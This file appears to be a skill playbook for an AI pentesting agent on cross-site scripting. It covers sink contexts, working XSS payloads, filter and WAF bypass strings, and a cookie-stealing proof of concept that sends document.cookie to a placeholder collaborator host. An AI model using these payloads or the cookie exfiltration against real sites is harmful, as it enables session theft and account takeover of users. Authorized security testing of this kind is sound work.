---
name: web-xss
description: Cross-Site Scripting detection→context-aware bypass→real-browser proof. Use when input is reflected/stored into HTML/JS/attr/URL/CSS, or during web vuln assessment. Triggers - XSS, reflected input, stored echo, alert, dalfox, cookie steal, javascript:.
tags: [vuln_assess, exploitation]
---

# Cross-Site Scripting (XSS)

## When this fires
The app echoes user-controlled input into a response without context-appropriate encoding — reflected (in URL/params), stored (saved then re-rendered), or DOM-based (client JS writes to innerHTML/document.write/location). Test every echo point found during mapping.

## Detect — context-aware (do NOT just try alert(1))
Identify the exact sink context first, then adapt payload:
- **HTML body**: `<script>alert(document.domain)</script>` → `%3Cscript%3E...`
- **HTML attribute**: `"><svg onload=alert(1)>` / `" autofocus onfocus=alert(1) x="`
- **JS string**: `'-alert(1)-'` / `\';alert(1);//` / `</script><script>alert(1)</script>`
- **CSS**: `</style><script>alert(1)</script>` or `expression(alert(1))` (IE legacy)
- **URL/javascript:**: `javascript:alert(1)` in href/src
- **DOM sink**: find sinks (innerHTML, eval, document.write, location) via grep of JS, then a source→sink payload.

## Payload engine — bypass filters fast
Start with the classic canaries to learn the filter, then escalate:
```bash
# what's reflected / filtered? use the proxy + a canary:
Canary1337"><svg onload=alert(1)>
# encoding bypasses (order, nested, mixed):
<scr<script>ipt>alert(1)</scri</script>pt>
`translate`d UTF-7: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
JS obfuscation: eval(atob('YWxlcnQoMSk='))
Unicode/numeric entities: &#x3C;script&#x3E;
```
WAF? → polyglot + event handlers that bypass common rules (`<img src=x onerror=alert(1)>`,
`<svg/onload=alert(1)>`, `<details open ontoggle=alert(1)>`). Test reflected context via encoding
changes; test stored via same-origin re-render.

## Exploit → PROVE IMPACT (concrete, not popup-only)
- **Stored/reflected that a victim visits**: craft a session-steal PoC:
```html
<script>fetch('//<COLLAB>/k?c='+document.cookie)</script>
```
run through Burp-captured request against an authorized victim account; watch the OOB callback → real cookie/session = high-impact proof.
- **DOM XSS in authorized context**: show it fires in a real browser (Playwright via proxy, screenshot) with a benign side-effect (read a canary injected into DOM).
- Keylogging/form-hijack PoCs only against your own authorized test account.

## Tooling
`dalfox` (reflected+stored scan), `nuclei -tags xss`, QuickJS/Node to validate payload strings, Playwright (browser proof + auto-submit).

## False positives / pitfalls
- Browser auto-canary `browser`-side reflection only (no JS sink) = informational.
- `alert(1)` firing alone is weak proof → always show real impact (cookie relay, canary read, session).
- CSP present? check `script-src`/nonce before claiming exploitability — a strong CSP downgrades severity.